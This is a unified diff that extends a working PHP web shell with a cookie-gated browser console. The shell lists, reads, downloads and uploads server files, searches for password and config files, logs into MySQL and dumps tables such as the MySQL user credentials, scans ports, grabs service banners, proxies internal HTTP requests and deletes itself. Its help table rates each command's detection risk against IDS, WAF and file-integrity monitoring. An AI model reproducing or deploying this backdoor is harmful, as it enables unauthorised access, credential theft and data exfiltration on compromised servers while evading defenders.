@@ -1,5 +1,4 @@
 <?php
-# Author: dund3rpwn
 $cookie_name  = "sessId";
 $secret_value = "7f88219c9e83a696";
 
@@ -21,102 +20,126 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
         return @new mysqli($hp[0], $arg1, $arg2, $dbn, $hp[1] ?? 3306);
     };
 
-    switch ($action) {
-        case 'download':
-            if (is_readable($target) && !is_dir($target)) {
-                while (ob_get_level()) ob_end_clean();
-                header('Content-Type: application/octet-stream');
-                header('Content-Disposition: attachment; filename="'.basename($target).'"');
-                readfile($target); exit;
-            } $out = "Unreadable."; break;
-        case 'dir':
-            $t = ($target === '..') ? dirname(getcwd()) : $target;
-            $l = @scandir($t);
-            $out = ($l !== false) ? implode("\n", $l) : (is_dir($t) ? "No Access." : "Not found.");
-            break;
-        case 'read': $out = is_readable($target) ? file_get_contents($target) : "Permission denied or file doesn't exist."; break;
-        case 'upload': $out = file_put_contents($target, base64_decode($arg1)) !== false ? "OK." : "Error."; break;
-        case 'find':
-            $found = [];
-            try {
-                $dir = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
-                $it = new RecursiveIteratorIterator($dir, RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);
-                foreach (@$it as $f) { 
-                    if ($arg1 === '' || stripos($f->getFilename(), $arg1) !== false) {
-                        $found[] = $f->getPathname(); 
+    try {
+        switch ($action) {
+            case 'download':
+                if (is_readable($target) && !is_dir($target)) {
+                    while (ob_get_level()) ob_end_clean();
+                    header('Content-Type: application/octet-stream');
+                    header('Content-Disposition: attachment; filename="'.basename($target).'"');
+                    readfile($target); exit;
+                } $out = "Unreadable."; break;
+            case 'dir':
+                $t = ($target === '..') ? dirname(getcwd()) : $target;
+                $l = @scandir($t);
+                $out = ($l !== false) ? implode("\n", $l) : (is_dir($t) ? "No Access." : "Not found.");
+                break;
+            case 'read': $out = is_readable($target) ? file_get_contents($target) : "Permission denied or file doesn't exist."; break;
+            case 'upload': $out = file_put_contents($target, base64_decode($arg1)) !== false ? "OK." : "Error."; break;
+            case 'find':
+                $found = [];
+                try {
+                    $dir = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
+                    $it = new RecursiveIteratorIterator($dir, RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);
+                    foreach (@$it as $f) { 
+                        if ($arg1 === '' || stripos($f->getFilename(), $arg1) !== false) {
+                            $found[] = $f->getPathname(); 
+                        }
                     }
+                    $out = empty($found) ? "No results." : implode("\n", $found);
+                } catch (Exception $e) { 
+                    $out = "Search failed. Permission issue."; 
                 }
-                $out = empty($found) ? "No results." : implode("\n", $found);
-            } catch (Exception $e) { 
-                $out = "Search failed. Permission issue."; 
-            }
-            break;
-        case 'stat':
-            if (!file_exists($target)) { $out = "Invalid."; break; }
-            $p = fileperms($target);
-            $out = "Path:  ".realpath($target)."\n";
-            $out .= "Perms: ".substr(sprintf('%o', $p), -4)."\n";
-            $out .= "R/W:   ".(is_readable($target)?'Y':'N')."/".(is_writable($target)?'Y':'N');
-            if (function_exists('posix_getpwuid')) {
-                $u = posix_getpwuid(fileowner($target));
-                $g = posix_getgrgid(filegroup($target));
-                $out .= "\nOwner: ".($u['name']??'?').":".($g['name']??'?');
-            }
-            break;
-        case 'port_scan':
-            $hp = explode(':', $target); $c = @fsockopen($hp[0], $hp[1]??80, $en, $es, 2);
-            $out = $c ? "Port ".$hp[1]." Open" : "Port ".$hp[1]." Closed"; if($c) fclose($c); break;
-        case 'service_banner':
-            $hp = explode(':', $target);
-            $c = @fsockopen($hp[0], $hp[1]??21, $en, $es, 3);
-            if ($c) {
-                $out = trim(fread($c, 1024)) ?: "[Connected, no banner]";
-                fclose($c);
-            } else $out = "Unreachable."; break;
-        case 'db_auth':
-            $db = $dbInit(); $out = $db->connect_errno ? "Failed: ".$db->connect_error : "Success: Logged in as ".$arg1; break;
-        case 'db_list':
-            $db = $dbInit(); $res = $db->query("SHOW DATABASES");
-            while($r = @$res->fetch_array()) $out .= $r[0]."\n"; break;
-        case 'db_tables':
-            $db = $dbInit($arg3); $res = @$db->query("SHOW TABLES");
-            while($r = @$res->fetch_array()) $out .= $r[0]."\n"; break;
-        case 'db_query':
-            $db = $dbInit($arg3);
-            if ($p[7]??0) usleep((int)$p[7]*1000);
-            $res = $db->query("SELECT * FROM ".$db->real_escape_string($p[5])." LIMIT ".((int)($p[6]??0)*10).", 10");
-            if ($res) while($r = $res->fetch_assoc()) $out .= json_encode($r)."\n"; break;
-        case 'dns': $out = filter_var($target, 273) ? (gethostbyaddr($target) ?: "No PTR") : (gethostbyname($target) ?: "Fail"); break;
-        case 'fetch':
-            $ch = curl_init($target);
-            curl_setopt_array($ch, [19913=>1, 64=>0, 13=>5, 10018=>'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0']);
-            $out = curl_exec($ch) ?: curl_error($ch); curl_close($ch); break;
-        case 'self_destruct': if ($target==='DELETEME') @unlink(__FILE__); exit;
-    case 'help':
-            $m = [
-                ['dir [path]', 'List directory', 'dir /var/www/html', 'Low: Standard filesystem read'],
-                ['stat [path]', 'Check permission', 'stat /var/www/html', 'Low: Native metadata syscall'],
-                ['read [file]', 'Read file', 'read /var/www/html/config.php', 'Low: Internal PHP stream read'],
-                ['find [path] [key]', 'Search string', 'find /var/www pass', 'Med: High CPU/Disk IO if path is large'],
-                ['download [file]', 'Download file', 'download /var/www/html/config.php', 'Med: File transfer in HTTP logs'],
-                ['upload [path] [b64]', 'Upload file', 'upload /var/www/html/test.txt b64', 'High: Disk write. Detectable by FIM'],
-                ['db_auth [h:p] [u] [p]', 'MySQL auth', 'db_auth 127.0.0.1:3306 root pass', 'Med: Failed logins logged by MySQL'],
-                ['db_list [h:p] [u] [p]', 'List DBs', 'db_list 127.0.0.1:3306 root pass', 'Low: Standard authenticated query'],
-                ['db_tables [h:p] [u] [p] [db]', 'List tables', 'db_tables 127.0.0.1:3306 root pass users', 'Low: Standard authenticated query'],
-                ['db_query [h:p] [u] [p] [db] [tbl] [pages] [ms]', 'SQL query', 'db_query 127.0.0.1:3306 root pass user creds 0 500', 'Med: Large queries may trigger WAF'],               
-                ['fetch [url]', 'HTTP request', 'fetch http://internal.site', 'Med: Request logged by target server'],
-                ['port_scan [h:p]', 'Port check', 'scan 127.0.0.1:3306', 'Med: Rapid connections can trigger IDS'],
-                ['service_banner [h:p]', 'Get banner', 'banner 127.0.0.1:21', 'Low: Passive socket connection'],
-                ['dns [target]', 'DNS lookup', 'dns dc.int.site', 'Low: Standard OS resolver call'],
-                ['self_destruct', 'Delete script', 'self_destruct DELETEME', 'Med: File deletion is often logged']
-            ];
-            $out = str_pad("COMMAND", 50) . str_pad("DESCRIPTION", 25) . str_pad("EXAMPLE", 55) . "OPSEC\n";
-            $out .= str_repeat("-", 150) . "\n";
-            foreach($m as $i) {
-                $out .= str_pad($i[0], 50) . str_pad($i[1], 25) . str_pad($i[2], 55) . $i[3] . "\n";
-            }
-            break;
-        default: $out = "Unknown.";
+                break;
+            case 'stat':
+                if (!file_exists($target)) { $out = "Invalid."; break; }
+                $p = fileperms($target);
+                $out = "Path:  ".realpath($target)."\n";
+                $out .= "Perms: ".substr(sprintf('%o', $p), -4)."\n";
+                $out .= "R/W:   ".(is_readable($target)?'Y':'N')."/".(is_writable($target)?'Y':'N');
+                if (function_exists('posix_getpwuid')) {
+                    $u = posix_getpwuid(fileowner($target));
+                    $g = posix_getgrgid(filegroup($target));
+                    $out .= "\nOwner: ".($u['name']??'?').":".($g['name']??'?');
+                }
+                break;
+            case 'port_scan':
+                $hp = explode(':', $target); $c = @fsockopen($hp[0], $hp[1]??80, $en, $es, 2);
+                $out = $c ? "Port ".$hp[1]." Open" : "Port ".$hp[1]." Closed"; if($c) fclose($c); break;
+            case 'service_banner':
+                $hp = explode(':', $target);
+                $c = @fsockopen($hp[0], $hp[1]??21, $en, $es, 3);
+                if ($c) {
+                    $out = trim(fread($c, 1024)) ?: "[Connected, no banner]";
+                    fclose($c);
+                } else $out = "Unreachable."; break;
+            case 'db_auth':
+                $db = $dbInit(); $out = $db->connect_errno ? "Failed: ".$db->connect_error : "Success: Logged in as ".$arg1; break;
+            case 'db_list':
+                $db = $dbInit(); $res = $db->query("SHOW DATABASES");
+                while($r = @$res->fetch_array()) $out .= $r[0]."\n"; break;
+            case 'db_tables':
+                $db = $dbInit($arg3); 
+                if ($res = @$db->query("SHOW TABLES")) {
+                    while($r = $res->fetch_array()) $out .= $r[0]."\n";
+                } else { $out = "Query error."; }
+                $db->close(); break;
+            case 'db_describe':
+                if (empty($p[5])) { $out = "Table required."; break; }
+                $db = $dbInit($arg3);
+                if ($res = @$db->query("DESCRIBE $p[5]")) {
+                    while ($r = $res->fetch_assoc()) $out .= $r['Field']." (".$r['Type'].")\n";
+                    $res->free();
+                } else { $out = "Error: ".$db->error; }
+                $db->close(); break;
+            case 'db_query':
+                if (empty($p[6])) { $out = "Usage: [db] [tbl] [cols]"; break; }
+                $db = $dbInit($p[4]); $m = (int)($p[8]??50); $o = ((int)($p[7]??0))*$m;
+                if ($res = @$db->query("SELECT $p[6] FROM $p[5] LIMIT $o,$m")) {
+                    $f = 1; while ($r = $res->fetch_assoc()) {
+                        if ($f) { $out .= implode(",", array_keys($r))."\n".str_repeat("-", 20)."\n"; $f = 0; }
+                        $out .= implode(",", array_values($r))."\n";
+                    }
+                    $out = $out ?: "[No rows]"; $res->free();
+                } else { $out = "Error: ".$db->error; }
+                $db->close(); break;
+            case 'dns': $out = filter_var($target, 273) ? (gethostbyaddr($target) ?: "No PTR") : (gethostbyname($target) ?: "Fail"); break;
+            case 'fetch':
+                $ch = curl_init($target);
+                curl_setopt_array($ch, [19913=>1, 64=>0, 13=>5, 10018=>'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0']);
+                $out = curl_exec($ch) ?: curl_error($ch); curl_close($ch); break;
+            case 'self_destruct': if ($target==='DELETEME') @unlink(__FILE__); exit;
+        case 'help':
+                $m = [
+                    ['dir [path]', 'List directory', 'dir /var/www/html', 'Low: Standard filesystem read'],
+                    ['stat [path]', 'Check permission', 'stat /var/www/html', 'Low: Native metadata syscall'],
+                    ['read [file]', 'Read file', 'read /var/www/html/config.php', 'Low: Internal PHP stream read'],
+                    ['find [path] [keyword]', 'Search for filename', 'find /var/www config', 'Med: High CPU/Disk IO if path is large'],
+                    ['download [file]', 'Download file', 'download /var/www/html/config.php', 'Med: File transfer in HTTP logs'],
+                    ['upload [path] [b64]', 'Upload file', 'upload /var/www/html/test.txt b64', 'High: Disk write. Detectable by FIM'],
+                    ['db_auth [h:p] [u] [p]', 'MySQL auth', 'db_auth 127.0.0.1:3306 root pass', 'Med: Failed logins logged by MySQL'],
+                    ['db_list [h:p] [u] [p]', 'List DBs', 'db_list 127.0.0.1:3306 root pass', 'Low: Standard authenticated query'],
+                    ['db_tables [h:p] [u] [p] [db]', 'List tables', 'db_tables 127.0.0.1:3306 root pass mysql', 'Low: Standard authenticated query'],
+                    ['db_describe [h:p] [u] [p] [db] [tbl]', 'List table schema/columns', 'db_describe 127.0.0.1:3306 root pass mysql user', 'Low: Standard authenticated query'],
+                    ['db_query [h:p] [u] [p] [db] [tbl] [cols] [pages] [rows]', 'SQL SELECT query', 'db_query 127.0.0.1:3306 root pass mysql user User,Password 0 500', 'Med: Large queries may trigger WAF'],
+                    ['fetch [url]', 'HTTP request', 'fetch http://internal.site', 'Med: Request logged by target server'],
+                    ['port_scan [h:p]', 'Port check', 'port_scan 127.0.0.1:3306', 'Med: Rapid connections can trigger IDS'],
+                    ['service_banner [h:p]', 'Get banner', 'service_banner 127.0.0.1:21', 'Low: Passive socket connection'],
+                    ['dns [target]', 'DNS lookup', 'dns dc.int.site', 'Low: Standard OS resolver call'],
+                    ['self_destruct', 'Delete script', 'self_destruct DELETEME', 'High: File deletion.  Detectable by FIM'],
+                    ['clear', 'Clear screen', 'clear', 'Low: Browser JavaScript only']
+                ];
+                $out = str_pad("COMMAND", 60) . str_pad("DESCRIPTION", 30) . str_pad("EXAMPLE", 70) . "OPSEC\n";
+                $out .= str_repeat("-", 200) . "\n";
+                foreach($m as $i) {
+                    $out .= str_pad($i[0], 60) . str_pad($i[1], 30) . str_pad($i[2], 70) . $i[3] . "\n";
+                }
+                break;
+            default: $out = "Unknown command. Run 'help'.";
+        }
+
+    } catch (Throwable $e) {
+        $out = "Runtime Error: " . $e->getMessage();
     }
     echo json_encode(['output' => nl2br(htmlentities($out, 50, 'UTF-8')), 'user' => get_current_user(), 'cwd' => getcwd(), 'ip' => $_SERVER['SERVER_ADDR'] ?? '']);
     exit;
@@ -150,6 +173,9 @@ Type 'help' for service utility list.</div>
     </div>
 
     <script>
+        let history = JSON.parse(sessionStorage.getItem('cmd_history') || "[]");
+        let historyIdx = -1;
+        let currentInput = ""; // Stores what you were typing before you hit 'up'
         const input = document.getElementById('in');
         const out = document.getElementById('out');
         const cwdDisplay = document.getElementById('cwd-display');
@@ -164,10 +190,39 @@ Type 'help' for service utility list.</div>
         }
 
         input.addEventListener('keydown', function(e) {
+            // --- Command History (Up/Down) ---
+            if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (historyIdx === -1) currentInput = input.value; // Save current draft
+                if (historyIdx < history.length - 1) {
+                    historyIdx++;
+                    input.value = history[historyIdx];
+                }
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (historyIdx > -1) {
+                    historyIdx--;
+                    input.value = historyIdx === -1 ? currentInput : history[historyIdx];
+                }
+            }
+
+            // --- Execute Command (Enter) ---
             if (e.key === 'Enter') {
                 const val = input.value;
-                if (val.trim() === 'clear') { out.innerHTML = 'Console cleared.\n'; input.value = ''; return; }
-                
+                if (!val.trim()) return;
+
+                // Save to history (unshift puts it at the start)
+                if (val !== history[0]) {
+                    history.unshift(val);
+                }
+                historyIdx = -1; // Reset pointer
+                sessionStorage.setItem('cmd_history', JSON.stringify(history));
+                if (val.trim() === 'clear') { 
+                    out.innerHTML = 'Console cleared.\n'; 
+                    input.value = ''; 
+                    return; 
+                }
+
                 out.innerHTML += `\n<span style="color:#777"># ${val}</span>\n`;
                 const p = new URLSearchParams();
                 p.append('act', val);
@@ -179,9 +234,9 @@ Type 'help' for service utility list.</div>
                         return res.blob().then(blob => {
                             const url = window.URL.createObjectURL(blob);
                             const a = document.createElement('a'); a.href = url;
-                            a.download = disp.split('filename=')[1].replace(/"/g, '') || 'file';
+                            a.download = disp.split('filename=')[1].replace(/"/g, '');
                             document.body.appendChild(a); a.click(); a.remove();
-                            return { output: "Binary download completed." };
+                            return { output: "Download complete." };
                         });
                     }
                     return res.json();
@@ -191,6 +246,8 @@ Type 'help' for service utility list.</div>
                     if (data.cwd) cwdDisplay.innerText = data.cwd;
                     input.value = '';
                     out.scrollTop = out.scrollHeight;
+                }).catch(err => {
+                    out.innerHTML += `<span style="color:red">Connection Error: ${err}</span>\n`;
                 });
             }
         });
